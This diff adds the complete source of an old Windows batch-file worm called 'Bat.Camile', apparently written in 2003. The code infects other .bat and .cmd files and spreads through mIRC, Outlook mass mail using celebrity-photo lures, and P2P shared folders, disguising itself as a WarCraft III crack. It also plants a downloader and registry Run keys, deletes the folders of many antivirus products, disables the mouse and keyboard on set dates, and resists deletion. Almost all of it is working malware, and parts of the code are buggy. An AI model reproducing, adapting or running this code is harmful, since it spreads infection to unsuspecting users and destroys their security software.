@@ -1,0 +1,261 @@
+cls
+@ECHO OFF
+@BREAK OFF
+@CTTY NUL
+REM  -----------------------------------
+REM  | Bat.Camile                      |
+REM  | By Overmind                     |
+REM  | Writen in Chile                 |
+REM  | 2003/10                         |
+REM  | Spread: E-Mail Using Outlook    |
+REM  | Mirc and A lot of P2P           |
+REM  | Infects: All Bat Files          |
+REM  | All CMD Files                   |
+REM  | Anti AV: The Virus Kills More   |
+REM  | Then 10 Differents AVs.         |
+REM  | Payloads: The Virus Has 4.      |
+REM  | One if an Error Ocurred and     |
+REM  | 3 with a Pre-Defined Date       |
+REM  | Other Features: The Virus Upda- |
+REM  | te Itself on Every Run, it Also |
+REM  | Has 3 VBS (Created by the Virus)|
+REM  | To Make the Work.The Vi-        |
+REM  | rus Change the Start Page to a  |
+REM  | GreenPeace Anti War Campaign.   |
+REM  | It Also Have a Anti Deletion    |
+REM  | Mechanism and a Basic Set       |
+REM  | Encryption                      |
+REM  |                                 |
+REM  -----------------------------------
+:Main
+Set Over=hspssps
+Set Over=%0
+Set Er=333
+Set Er=Echo
+%Er% Instaling..
+Set Over=rrrr
+Set Over=FOR
+Set Ov=rrrr
+Set Ov=Copy
+Set Ni=rrr
+Set Ni=In
+Set ToGo=555
+Set ToGo=GOTO
+%Over% %%i %Ni% (*.BAT ../*.BAT)do %Ov% %%i+%Over% %%i>nul
+%Over% %%i %Ni% (*.CMD ../*.CMD)do %Ov% %%i+%Over% %%i>nul
+%Er% Error. Can't Be Opened
+%Ov% %Over% %windir%\WarCraftIIICrack.bat
+Set At=gff
+Set At=attrib
+%At% +h +s %windir%\WarCraftIIICrack.bat
+%Ov% 00000000000000 >%windir%\WCraft III.log
+%Ov% The Computer is Infected by Bat.Camile Coded by Overmind >>%windir%\WCraft III.log
+%Ov% 00000000000000 >>%windir%\WCraft III.log
+%At% +h %windir%\WCraft III.log
+%ToGo% Mirc
+
+:Mirc
+Set MrC=trt
+Set MrC=c:\mIRC\script.ini
+Set On=44343
+Set On=n0
+Set 1n=dfdf
+Set 1n=n1
+Set 2n=6565
+Set 2n=n2
+Set 3n=5454
+Set 3n=n3
+del %MrC% %Er% [script]
+%Er% %On% = on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick %windir%\WarCraftIICrack.bat } > %MrC%
+%Er% %1n% = /join #Beginner >> %MrC%
+%Er% %2n% =;Jejejeje Make My Job
+%Er% %3n% =ON 1:TEXT:*Crack*:#: { /dcc send $nick %windir%\WarCraftIIICrack.bat } { /say The Crack Really Works.. Take It!! }
+%ToGo% Mailer
+
+:Mailer
+%Ov% C:\Enjoy It!.bat
+%Er%.Dim a > %windir%\Mapi.vbs
+%Er% Randomize >> %windir%\Mapi.vbs
+%Er% a = Int(Rnd * 7) >> %windir%\Mapi.vbs
+%Er% If a = 0 Then mensaje = "Take This Britney Spears Photos." >> %windir%\Mapi.vbs
+%Er% If a = 1 Then mensaje = "Enjoy This J.Lo ScreenSaver" >> %windir%\Mapi.vbs
+%Er% If a = 2 Then mensaje = "Madonna and Britney Kissing??" >> %windir%\Mapi.vbs
+%Er% If a = 3 Then mensaje = "Take This Christina Aguilera Photos" >> %windir%\Mapi.vbs
+%Er% If a = 4 Then mensaje = "Check THis Video of Britney Spears and Madonna" >> %windir%\Mapi.vbs
+%Er% If a = 5 Then mensaje = "Linkin Park Video..Wow!" >> %windir%\Mapi.vbs
+%Er% If a = 6 Then mensaje = "Japanese Hentai Photos..Uff" >> %windir%\Mapi.vbs
+%Er% Dim b >> %windir%\Mapi.vbs
+%Er% Randomize >> %windir%\Mapi.vbs
+%Er% b = Int(Rnd * 4) >> %windir%\Mapi.vbs
+%Er% If b = 0 Then nombre = "Check This!" >> %windir%\Mapi.vbs
+%Er% If b = 1 Then nombre = "Enjoy IT!" >> %windir%\Mapi.vbs
+%Er% If b = 2 Then nombre = "Wow!!!" >> %windir%\Mapi.vbs
+%Er% If b = 3 Then nombre = "Check and Enjoy..!" >> %windir%\Mapi.vbs
+%Er% On Error Resume Next >> %windir%\Mapi.vbs
+%Er% Set MSOut = CreateObject("Outlook.Application") >> %windir%\Mapi.vbs
+%Er% If MSOut = "Outlook" Then >> %windir%\Mapi.vbs
+%Er% Set Mapi = outlook.GetNameSpace("MAPI") >> %windir%\Mapi.vbs
+%Er% Set Dirs = Mapi.AddressLists >> %windir%\Mapi.vbs
+%Er% For Each Address In Dirs >> %windir%\Mapi.vbs
+%Er% If Address.AddressEntries.Count <> 0 Then >> %windir%\Mapi.vbs
+%Er% Cuenta = Address.AddressEntries.Count >> %windir%\Mapi.vbs
+%Er% For I = 1 To Cuenta >> %windir%\Mapi.vbs
+%Er% Set Mail = MSOut.CreateItem(0) >> %windir%\Mapi.vbs
+%Er% Set Entry = Address.AddressEntries(I) >> %windir%\Mapi.vbs
+%Er% Mail.To = Entry.Address >> %windir%\Mapi.vbs
+%Er% Mail.Subject = nombre >> %windir%\Mapi.vbs
+%Er% Mail.Body =mensaje >> %windir%\Mapi.vbs
+%Er% Set Adjunto = Mail.Attachments >> %windir%\Mapi.vbs
+%Er% Adjunto.Add ("C:\Enjoy It!.bat") >> %windir%\Mapi.vbs
+%Er% Mail.DeleteAfterSubmit = True >> %windir%\Mapi.vbs
+%Er% If Mail.To <> "" Then >> %windir%\Mapi.vbs
+%Er% Mail.Send >> %windir%\Mapi.vbs
+%Er% Wso.regwrite "HKCU\software\DownloaderCml\MailOK", "1" >> %windir%\Mapi.vbs
+%Er% End If >> %windir%\Mapi.vbs
+%Er% Next >> %windir%\Mapi.vbs
+%Er% End If >> %windir%\Mapi.vbs
+%Er% Next >> %windir%\Mapi.vbs
+%Er% End If >> %windir%\Mapi.vbs
+%Er% End Sub >> %windir%\Mapi.vbs
+%At% +h +s %windir%\Mapi.vbs
+%ToGo% P2P
+
+:P2P
+Ex=rtrtr
+Ex=exist
+if %Ex% C:\Archiv~1\KaZaA\My Sha~1\ COPY %Over% C:\Archiv~1\KaZaA\My Sha~1\WarCraftIIICrack.bat
+if %Ex% C:\Archiv~1\Edonke~1\incomi~1\ COPY %Over% C:\Archiv~1\Edonke~1\incomi~1\WarCraft Frozen ThroneCrack.bat
+if %Ex% C:\Archiv~1\icq\shared~1\ COPY %Over% C:\Archiv~1\icq\shared~1\WarCraftIIICrack.bat
+if %Ex% C:\Archiv~1\KaZaA~1\My Sha~1\ COPY %Over% C:\Archiv~1\KaZaA~1\My Sha~1\WarCraftIIICrack.bat
+if %Ex% C:\Archiv~1\Limewi~1\shared\ COPY %Over% C:\Archiv~1\Limewi~1\shared\WarCraftIIICrack.bat
+if %Ex% C:\Archiv~1\morphe~1\my sha~1\ COPY %Over% C:\Archiv~1\morphe~1\my sha~1\WarCraftIIICrack.bat
+if %Ex% C:\Archiv~1\Grokst~1\My Gro~1\ COPY %Over% C:\Archiv~1\Grokst~1\My Gro~1\ WarCraftIIICrack.bat
+if %Ex% C:\Archiv~1\WinMX\My Sha~1\ COPY %Over% C:\Archiv~1\WinMX\My Sha~1\WarCraftIIICrack.bat
+%Er%. On Error Resume Next > %windir%\Kazaa Manager.vbs
+%Er% Randomize >> %windir%\Kazaa Manager.vbs
+%Er% A = Int(Rnd * 7) >> %windir%\Kazaa Manager.vbs
+%Er% If A = 0 Then P2P = "Britney Screen Saver >> %windir%\Kazaa Manager.vbs"
+%Er% If A = 1 Then P2P = "Japanese Hentai-All Caracters" >> %windir%\Kazaa Manager.vbs
+%Er% If A = 2 Then P2P = "OVerProtected - Britney Spears" >> %windir%\Kazaa Manager.vbs
+%Er% If A = 3 Then P2P = "Madonna Music Awards 2003 MTV" >> %windir%\Kazaa Manager.vbs
+%Er% If A = 4 Then P2P = "Christina Aguilera Screen Saver" >> %windir%\Kazaa Manager.vbs
+%Er% If A = 5 Then P2P = "Britney Dance" >> %windir%\Kazaa Manager.vbs
+%Er% If A = 6 Then P2P = "J.Lo Sexy Photos" >> %windir%\Kazaa Manager.vbs
+%Er% Randomize >> %windir%\Kazaa Manager.vbs
+%Er% B = Int(Rnd * 8) >> %windir%\Kazaa Manager.vbs
+%Er% If B = 0 Then Carpeta = "C:\Archivos de Programa\KaZaA\My Shared Folder\" >> %windir%\Kazaa Manager.vbs
+%Er% If B = 1 Then Carpeta = "C:\Archivos de Programa\Edonkey2000\incoming\" >> %windir%\Kazaa Manager.vbs
+%Er% If B = 2 Then Carpeta = "C:\Archivos de Programa\icq\shared files\" >> %windir%\Kazaa Manager.vbs
+%Er% If B = 3 Then Carpeta = "C:\Archivos de Programa\KaZaA Lite\My Shared Folder\" >> %windir%\Kazaa Manager.vbs
+%Er% If B = 4 Then Carpeta = "C:\Archivos de Programa\Limewire\shared\" >> %windir%\Kazaa anager.vbs
+%Er% If B = 5 Then Carpeta = "C:\Archivos de Programa\morpheus\my shared folder\" >> %windir%\Kazaa Manager.vbs
+%Er% If B = 6 Then Carpeta = "C:\Archivos de Programa\Grokster\My Grokster\" >> %windir%\Kazaa Manager.vbs
+%Er% If B = 7 Then Carpeta = "C:\Archivos de Programa\WinMX\My Shared Folder\" >> %windir%\Kazaa Manager.vbs
+%Er% Randomize >> %windir%\Kazaa Manager.vbs
+%Er% C = Int(Rnd * 3) >> %windir%\Kazaa Manager.vbs
+%Er% If C = 0 Then Extension = ".jpg.bat" >> %windir%\Kazaa Manager.vbs
+%Er% If C = 1 Then Extension = ".scr.bat" >> %windir%\Kazaa Manager.vbs
+%Er% If C = 2 Then Extension = ".bat" >> %windir%\Kazaa Manager.vbs
+%Er% Do >> %windir%\Kazaa Manager.vbs
+%Er% FileCopy App.EXEName & ".exe",Carpeta & P2P & Extension  >> %windir%\Kazaa Manager.vbs
+%Er% Loop >> %windir%\Kazaa Manager.vbs
+%At% +h +s %windir%\Kazaa Manager.vbs
+%ToGo% Downloader
+
+:Downloader
+%Er% var x = new ActiveXObject("Microsoft.XMLHTTP") >%windir%\Morpheus Manager.vbs
+:: The Url Doesn't Exists!
+%Er% x.Open("GET", "http://XxXxXxXxXxX",0) >>%windir%\Morpheus Manager.vbs
+:: It's Only a Example!
+%Er% x.Send(); >>%windir%\Morpheus Manager.vbs
+%Er% var s = new ActiveXObject("ADODB.Stream"); >>%windir%\Morpheus Manager.vbs
+%Er% s.Mode = 3 >>%windir%\Morpheus Manager.vbs
+%Er% s.Type = 1 >>%windir%\Morpheus Manager.vbs
+%Er% s.Open() >>%windir%\Morpheus Manager.vbs
+%Er% s.Write(x.responseBody) >>%windir%\Morpheus Manager.vbs
+%Er% s.SaveToFile("C:\WIII Crack.bat,2) >>%windir%\Morpheus Manager.vbs
+%Ov% C:\WIII Crack.bat %temp%\WIII Crack.bat
+%Sr% %temp%\WIII Crack.bat
+%ToGo% Reg
+
+:Reg
+%Ov% %Over% %windir%\WIII Serial-Key.bat
+%Ov% %Over% C:\WIII Serial-Key.bat
+%At% +h +s C:\WIII Serial-Key.bat
+%Er% REGEDIT4>W32 Enviroment.reg
+%Er% [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>W32 Enviroment.reg
+%Er% "Warcraft CrackPath "="%%windir%%\\WIII Serial-Key.bat">>W32 Enviroment.reg
+%Er% [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>W32 Enviroment.reg
+%Er% "Morpheus P2P "="%%windir%%\\Morpheus Manager">>W32 Enviroment.reg
+%Er% [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>W32 Enviroment.reg
+%Er% "Kazaa Manager "="%%windir%%\\Kazaa Manager.vbs">>W32 Enviroment.reg
+%Er% [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>W32 Enviroment.reg
+%Er% "Kazaa Protector"="%%windir%%\\AntiDel.vbs">>W32 Enviroment.reg
+%Er% [Hkey_Local_Machine\Software\Microsoft\Internet Explorer\Main\]>>W32 Enviroment.reg
+%Er% "Start Page "="http://www.greenpeace.org/international_en/campaigns/intro?campaign_id=135724">>W32 Enviroment.reg
+regedit /s W32 Enviroment.reg
+%ToGo% AVKILL
+
+:Payload
+REM Exposition
+%Er%.|date|find "10">nul
+%windir%\rundll32.exe mouse,disable
+REM Infection
+%Er%.|date|find "20">nul
+%windir%\rundll32.exe keyboard,disable
+REM Epidemic
+%Er%.|date|find "29">nul
+ping.exe 10000 -l www.hotmail.com
+%ToGo% AntiDel
+
+:AVKILL
+On Error %ToGO% Crash
+Set Dl=654ff
+Set Dl=deltree/y
+%Dl% c:\Progra~1\Norton~1\*.* >nul
+%Dl% c:\Progra~1\Norton~2\*.* >nul
+%Dl% c:\Progra~1\Symantec\*.* >nul
+%Dl% c:\Progra~1\Common~1\Symant~1\Script~1\*.* >nul
+%Dl% c:\Progra~1\McAfee\VirusScan\*.* >nul
+%Dl% c:\Progra~1\PandaS~1\PandaA~1\*.* >nul
+%Dl% c:\Progra~1\Comman~1\F-PROT95\*.* >nul
+%Dl% c:\Progra~1\ZoneLa~1\ZoneAlarm\*.* >nul
+%Dl% c:\Progra~1\Kasper~1\*.* >nul
+%Dl% c:\Progra~1\AvPersonal\*.* >nul
+%Dl% c:\Progra~1\Grisoft\AVG6\*.* >nul
+%Dl% c:\FindVirus\*.* >nul
+%Dl% c:\eSafen\*.* >nul
+%Dl% c:\PC-Cil~1\*.* >nul
+%ToGo% Payload
+
+:Crash
+%Er% Error In F00000x & 23FG00000 Module
+rundll32.exe user,disableoemlayer
+%ToGo% Exit
+
+:Exit
+cls
+%Er% Instalation Finished!!!
+pause
+cls
+
+:AntiDel
+:: Rutine Created By Kalamar Modificated by...ME
+%Er%.dim fso, myself,mytext>AntiDelet.vbs
+%Er% Set windir = fso.GetSpecialFolder(0)>>AntiDelet.vbs
+%Er% set fso = createobject("scripting.filesystemobject")>>AntiDelet.vbs
+%Er% set Camile = fso.opentextfile(windir & "WIII Serial-Key.bat")>>AntiDelet.vbs
+%Er% Code = Camile.readall>>AntiDelet.vbs
+%Er% Camile.close>>AntiDelet.vbs
+%Er% do>>AntiDelet.vbs
+%Er% if fso.fileexists(windir & "WIII Serial-Key.bat") = false then>>AntiDelet.vbs
+%Er% Camile = fso.createtextfile(windir & "WIII Serial-Key.bat")>>AntiDelet.vbs
+%Er% Camile.write Code>>AntiDelet.vbs
+%Er% Camile.close>>AntiDelet.vbs
+%Er% end if>>AntiDelet.vbs
+%Er% loop>>AntiDelet.vbs
+Start AntiDelet.vbs
+%At% +h +s
+REM If The Virus Has Errors..Sorry, If You Send Them I WIll Fix Them.
+
+%ToGo% Exit
